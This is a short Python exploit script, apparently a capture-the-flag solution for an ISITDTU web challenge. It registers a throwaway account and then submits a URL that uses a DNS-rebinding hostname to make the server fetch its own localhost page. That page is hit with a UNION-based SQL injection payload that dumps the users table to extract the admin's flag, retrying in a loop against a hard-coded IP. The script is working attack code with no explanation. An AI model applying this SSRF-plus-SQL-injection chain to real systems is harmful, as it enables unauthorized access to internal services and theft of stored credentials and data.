import string
import requests
import random
import re

sess = requests.Session()
URL = 'http://34.124.157.127:5005'
REGEX_FLAG = r'<th>admin,ISITDTU(.*?)</tbody>'

def random_string(N:int)->str:
	return ''.join(random.choices(string.ascii_letters + string.digits, k=N))

def register(username):
	data = {'username':username,'password':'taidh','submit':1}
	r = sess.post(URL+'/register.php',data=data)

def login(username):
	data = {'username':username,'password':'taidh','submit':1}
	r = sess.post(URL+'/login.php',data=data)

def get_flag():
	data = {'url':'http://7f000001.01010101.rbndr.us/home.php?id=1%20union%20select%201,make_set(1%7C4,%602%60,%603%60,%604%60)from(select%201,2,3,4%20union%20select%20*%20from%20users)a'}
	while True:
		try:
			r = sess.post(URL+'/index.php',data=data)
			if 'ISITDTU' in r.text:
				flag = re.findall(REGEX_FLAG,r.text,re.DOTALL)[0]
				print('ISITDTU'+flag)
				exit(0)
		except Exception as e:
			print(e)

if __name__ == '__main__':
	username = random_string(8)
	register(username)
	login(username)
	get_flag()